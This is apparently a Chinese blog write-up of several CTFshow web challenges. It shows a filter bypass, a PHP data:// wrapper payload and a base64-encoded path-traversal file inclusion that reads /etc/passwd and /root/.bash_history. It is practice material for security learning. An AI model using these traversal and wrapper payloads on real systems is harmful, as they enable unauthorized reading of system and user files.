---
title: "CTFshow1221摆烂杯 Wp"
slug: "ctfshow-1221-bailancup-wp"
description: "桥洞底下盖小被，java，狗都不学"
date: 2021-12-28T20:06:48+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://ctf.show/challenges

## web签到

![image-20211224183707592](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224183707592.png)

一眼flask，简单fuzz一下发现过滤了字母 斜杠 引号 注释符 花括号 百分号 点号

没过滤的还有括号和加减乘除

```
A: 114)+(0
B: 1
C: -1
```

## 一行代码

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-11-18 21:25:22
# @Last Modified by:   h1xa
# @Last Modified time: 2021-11-18 22:14:12
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/



echo !(!(include "flag.php")||(!error_reporting(0))||stripos($_GET['filename'],'.')||($_GET['id']!=0)||(strlen($_GET['content'])<=7)||(!eregi("ctfsho".substr($_GET['content'],0,1),"ctfshow"))||substr($_GET['content'],0,1)=='w'||(file_get_contents($_GET['filename'],'r') !== "welcome2ctfshow"))?$flag:str_repeat(highlight_file(__FILE__), 0);
```

现在都爱这种一行流了？

整体是三目运算符，如果前面的表达式整体为真则返回$flag，而外面又套了`!()`，所以需要括号内部为假，而又都是`||`连接，所以需要每个小括号自己都为假，挨个看看

- `$_GET['id']!=0`

给id赋值为0或者直接留空

- `strlen($_GET['content'])<=7`

content长于7

- `!eregi("ctfsho".substr($_GET['content'],0,1),"ctfshow")`

没匹配为假，则匹配为真，content=wwwwwww

- `substr($_GET['content'],0,1)=='w'`

把content改个大写

- `file_get_contents($_GET['filename'],'r') !== "welcome2ctfshow"`

用data://伪协议

payload

```
?id=0&content=Wwwwwwww&filename=data://text/plain,welcome2ctfshow
```

## 黑客网站

![image-20211224210814499](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224210814499.png)

源码提示 flag不在这个服务器上，不用扫描，不用渗透

看字符串末尾有onion，拼在一起

```
http://tyros4qws3mmbubgjqje46ncv35jaqjgeb3nqiuf23ijoj4zwasxohyd.onion
```

访问就行了捏~

## ***登陆不了

在验证码的地方有个参数，尝试文件包含

```
http://bf986069-fc4e-42a3-b09b-c966f9e17a3c.challenge.ctf.show/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d
```

雀食有/etc/passwd，但是看不了/flag，看一下别的东西

```
# /root/.bash_history
/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vcm9vdC8uYmFzaF9oaXN0b3J5
```

![image-20211224202852805](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224202852805.png)

好吧，竟然是java，先爬了
